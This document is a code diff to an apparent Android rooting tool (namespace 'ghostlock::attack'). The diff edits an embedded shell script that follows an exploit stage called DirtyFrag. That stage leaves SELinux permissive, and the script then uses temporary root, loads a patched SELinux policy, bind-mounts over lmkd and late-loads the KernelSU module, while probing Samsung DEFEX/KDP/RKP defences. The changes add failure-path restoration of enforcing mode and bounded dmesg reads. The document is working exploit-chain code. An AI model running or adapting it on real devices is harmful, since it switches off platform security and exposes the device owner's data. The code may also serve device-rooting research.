@@ -310,8 +310,25 @@ namespace ghostlock::attack {
             "echo \"[*] ksud=$KSUD\" >>\"$LOG\"\n"
             "echo \"[*] ksud_file=$(ls -l \"$KSUD\" 2>/dev/null)\" >>\"$LOG\"\n"
             "echo \"[*] uname=$(uname -r)\" >>\"$LOG\"\n"
+            /* W1 leaves SELinux permissive; every post-W1 failure exit restores
+             * it, so a run that cannot finish the root phase does not leave the
+             * device permissive until reboot. Dumps are written before this
+             * call: the dump path is blocked once enforcing is back. */
+            "restore_enforce() {\n"
+            "  e_reason=\"$1\"\n"
+            "  e_before=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+            "  echo \"[*] enforcing restore: reason=$e_reason before=${e_before:-unreadable}\" >>\"$LOG\"\n"
+            "  if echo 1 > /sys/fs/selinux/enforce 2>/dev/null; then e_wrote=1; else e_wrote=0; fi\n"
+            "  e_after=$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
+            /* The DirtyFrag shell runs as toolbox, which may set but not read
+             * the enforce node: the successful write is the fact the stage can
+             * use. It goes to stdout, which survives the enforcing restore
+             * where a $LOG write does not. */
+            "  echo \"ENFORCE-RESTORE reason=$e_reason before=${e_before:-unreadable} wrote=$e_wrote readback=${e_after:-unreadable}\"\n"
+            "}\n"
             "if [ \"$(id -u)\" -ne 0 ]; then\n"
             "  echo '[!] temp su unavailable; aborting' >>\"$LOG\"\n"
+            "  restore_enforce not-root\n"
             "  exit 1\n"
             "fi\n"
             /* Diagnostics for the Samsung mount path: the init shell's
@@ -429,7 +446,7 @@ namespace ghostlock::attack {
             "  if [ -n \"$DEBUG_DIR\" ]; then KMSG_LOG=\"$DEBUG_DIR/kmsg-live.txt\"; fi\n"
             "  if [ -z \"$KMSG_LOG\" ]; then KMSG_LOG=\"$HOME_DIR/kmsg-live.txt\"; fi\n"
             "  if ! ( : >\"$KMSG_LOG\" ) 2>/dev/null; then KMSG_LOG=\"/data/local/tmp/kmsg-live-$$.txt\"; fi\n"
-            "  ( while kill -0 $$ 2>/dev/null; do dmesg 2>/dev/null | tail -n 300 >\"$KMSG_LOG.new\"; mv \"$KMSG_LOG.new\" \"$KMSG_LOG\" 2>/dev/null; sync; sleep 0.5; done ) &\n"
+            "  ( while kill -0 $$ 2>/dev/null; do timeout 2 dmesg 2>/dev/null | tail -n 300 >\"$KMSG_LOG.new\"; mv \"$KMSG_LOG.new\" \"$KMSG_LOG\" 2>/dev/null; sync; sleep 0.5; done ) &\n"
             "  KMSG_DRAIN_PID=$!\n"
             "  echo \"KMSG-DRAIN=$KMSG_LOG\"\n"
             "fi\n"
@@ -449,7 +466,7 @@ namespace ghostlock::attack {
             "    echo '== selinux =='\n"
             "    getenforce 2>/dev/null\n"
             "  } >\"$DEBUG_DIR/kernel-info.txt\" 2>&1\n"
-            "  if ! dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
+            "  if ! timeout 2 dmesg >\"$DEBUG_DIR/kernel-dmesg.log\" 2>&1; then\n"
             "    echo '[!] dmesg unavailable' >>\"$DEBUG_DIR/kernel-dmesg.log\"\n"
             "  fi\n"
             "  for f in /sys/fs/pstore/*; do\n"
@@ -487,6 +504,7 @@ namespace ghostlock::attack {
             "AVER=$(uname -r | grep -o 'android[0-9]*' | head -1)\n"
             "if [ -z \"$AVER\" ] || [ -z \"$KVER\" ]; then\n"
             "  echo '[!] cannot parse KMI from uname -r' >>\"$LOG\"\n"
+            "  restore_enforce kmi-parse\n"
             "  exit 1\n"
             "fi\n"
             "KMI=\"${AVER}-${KVER}\"\n"
@@ -517,6 +535,7 @@ namespace ghostlock::attack {
             "POLICY=\"$POLICY_DIR/ghostlock-selinux.policy\"\n"
             "printf '' >\"$POLICY\" 2>/dev/null || {\n"
             "  echo '[!] cannot create policy dump' >>\"$LOG\"\n"
+            "  restore_enforce policy-dump\n"
             "  exit 1\n"
             "}\n"
             "trap '[ -n \"$KMSG_DRAIN_PID\" ] && kill $KMSG_DRAIN_PID 2>/dev/null; [ -n \"$KMSG_LOG\" ] && rm -f \"$KMSG_LOG.new\" 2>/dev/null; umount -l /system/bin/lmkd 2>/dev/null; rm -f \"$POLICY\"; [ \"${DUMP_DONE:-0}\" = 1 ] || dump_debug' EXIT\n"
@@ -560,6 +579,10 @@ namespace ghostlock::attack {
             "  fi\n"
             "  sleep 2\n"
             "done\n"
+            /* Test hook: dirtyfrag.mode "failfixup" forces the failure branch so
+             * the failure-exit enforcing restore and the stage's DFRC verdict
+             * can be exercised on a device whose late-load would succeed. */
+            "case \"$MODE_TEXT\" in *failfixup*) echo '[*] test: forcing fixup failure' >>\"$LOG\"; FIXUP_RC=1 ;; esac\n"
             "echo \"[*] policy fixup rc=$FIXUP_RC\" >>\"$LOG\"\n"
             /* The working copy is spent once the policy loaded: delete it here,
              * not only in the EXIT trap. Measured 2026-10-09: the trap runs in
@@ -577,6 +600,9 @@ namespace ghostlock::attack {
             "  KSU_ALREADY=0\n"
             "  if [ ! -x \"$KSUD\" ]; then\n"
             "    echo '[!] ksud missing; cannot late-load' >>\"$LOG\"\n"
+            "    dump_debug\n"
+            "    DUMP_DONE=1\n"
+            "    restore_enforce ksud-missing\n"
             "    exit 1\n"
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
@@ -616,19 +642,11 @@ namespace ghostlock::attack {
             "  if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; break; fi\n"
             "  sleep 0.1\n"
             "done\n"
-            /* Unredirected so the native's script-output carries the verdict
-             * even when the app's log path was not writable. The dmesg tail
-             * names the DEFEX/KDP side of a failed load before the box can
-             * reset (the polled drain keeps the last full snapshot). */
-            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
-            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
-            "  dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
-            "fi\n"
-            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+            "if [ \"$KSU_READY\" -eq 1 ]; then\n"
+            "  echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
+            "else\n"
             "  echo '[!] KernelSU module not loaded' >>\"$LOG\"\n"
-            "  exit 1\n"
             "fi\n"
-            "echo '[+] KernelSU module loaded' >>\"$LOG\"\n"
             /* Dump while still permissive: after the enforcing restore the
              * toolbox domain cannot write the app's data dir, which is why the
              * previous build's dump silently vanished. The late-load path also
@@ -638,10 +656,33 @@ namespace ghostlock::attack {
             "DUMP_DONE=1\n"
             "if [ \"$KSU_ALREADY\" -eq 1 ]; then\n"
             "  echo \"[*] kernelsu already loaded; restoring enforcing\" >>\"$LOG\"\n"
-            "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
+            "  restore_enforce already-loaded\n"
+            "elif [ \"$KSU_READY\" -eq 1 ]; then\n"
+            /* The module re-enforces at the end of its init; this write is a
+             * no-op then, and the corrective one if it did not. */
+            "  restore_enforce late-loaded\n"
+            "fi\n"
+            /* Unredirected so the native's script-output carries the verdict
+             * even when the app's log path was not writable. The dmesg tail
+             * names the DEFEX/KDP side of a failed load before the box can
+             * reset (the polled drain keeps the last full snapshot). This
+             * block is diagnostic only: it runs after the marker, the dump and
+             * the enforcing restore, and every dmesg read is bounded, so a
+             * stuck dmesg can never hold the cleanup. */
+            "if [ \"$NO_INSTR\" -eq 0 ]; then\n"
+            "  echo \"KSU-SUMMARY enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) kernelsu=$(grep -c '^kernelsu' /proc/modules 2>/dev/null) lmkd_mount=$(grep -c ' /system/bin/lmkd ' /proc/self/mountinfo 2>/dev/null) log=$LOG\"\n"
+            "  timeout 2 dmesg 2>/dev/null | command grep -i -E 'defex|kdp|rkp|kernelsu' | tail -n 15\n"
+            "fi\n"
+            "if [ \"$KSU_READY\" -ne 1 ]; then\n"
+            "  restore_enforce ksu-not-loaded\n"
+            "  exit 1\n"
             "fi\n"
             "else\n"
-            "  echo '[!] fixup failed; SELinux left permissive' >>\"$LOG\"\n"
+            "  echo '[!] fixup failed; restoring enforcing' >>\"$LOG\"\n"
+            "  dump_debug\n"
+            "  DUMP_DONE=1\n"
+            "  restore_enforce fixup-failed\n"
+            "  exit 1\n"
             "fi\n",
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
